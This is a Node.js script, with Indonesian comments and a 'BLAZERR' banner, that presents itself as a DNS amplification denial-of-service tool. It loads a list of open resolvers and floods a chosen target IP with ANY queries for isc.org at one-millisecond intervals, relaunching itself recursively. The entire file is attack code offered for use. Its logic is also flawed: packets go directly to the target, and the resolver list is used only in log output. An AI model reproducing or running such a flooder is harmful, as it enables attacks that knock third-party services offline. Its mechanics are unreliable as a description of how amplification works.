const dgram = require('dgram');
const dns = require('dns');
const fs = require('fs');

// Konfigurasi target
const TARGET_IP = ''; // Ganti dengan IP target
const TARGET_PORT = 53;
const QUERY_DOMAIN = 'isc.org'; // Domain dengan respons besar
const QUERY_TYPE = 'ANY'; // Tipe query untuk amplifikasi maksimal

// Load list resolver DNS terbuka (format: IP per baris)
const RESOLVERS = fs.readFileSync('resolvers.txt', 'utf-8').split('\n').filter(ip => ip.trim());

// Membuat DNS query payload (menggunakan buffer manual untuk efisiensi)
function createDNSQuery(domain, type) {
  // Header DNS (ID, flags, questions count)
  const buf = Buffer.alloc(512);
  buf.writeUInt16BE(0x1234, 0); // Transaction ID
  buf.writeUInt16BE(0x0100, 2); // Flags (recursive query)
  buf.writeUInt16BE(0x0001, 4); // Questions count
  buf.writeUInt16BE(0x0000, 6); // Answer RRs
  buf.writeUInt16BE(0x0000, 8); // Authority RRs
  buf.writeUInt16BE(0x0000, 10); // Additional RRs
  
  // Encode domain name
  let offset = 12;
  domain.split('.').forEach(part => {
    buf.writeUInt8(part.length, offset);
    offset += 1;
    buf.write(part, offset);
    offset += part.length;
  });
  buf.writeUInt8(0, offset); // Null terminator
  offset += 1;

  // Query type (ANY = 255) dan class (IN = 1)
  buf.writeUInt16BE(255, offset); // Type ANY
  offset += 2;
  buf.writeUInt16BE(1, offset); // Class IN
  
  return buf.slice(0, offset + 2);
}

// Fungsi utama amplifikasi
function launchAmplification() {
  const socket = dgram.createSocket('udp4');
  const query = createDNSQuery(QUERY_DOMAIN, QUERY_TYPE);
  
  // Kirim ke setiap resolver secara paralel
  RESOLVERS.forEach(resolver => {
    setInterval(() => {
      socket.send(query, 0, query.length, TARGET_PORT, TARGET_IP, (err) => {
        if (!err) {
          console.log(`[+] Amplified packet sent via ${resolver}`);
        }
      });
    }, 1); // Interval minimal untuk throughput maksimal
  });

  // Tingkatkan volume dengan multi-threading simulasi
  for (let i = 0; i < 10; i++) {
    setTimeout(() => launchAmplification(), i * 100);
  }
}

// Eksekusi
console.log(`[BLAZERR] DNS Amplification 100% LOADED`);
console.log(`[!] Target: ${TARGET_IP}`);
console.log(`[!] Resolvers: ${RESOLVERS.length} servers`);
launchAmplification();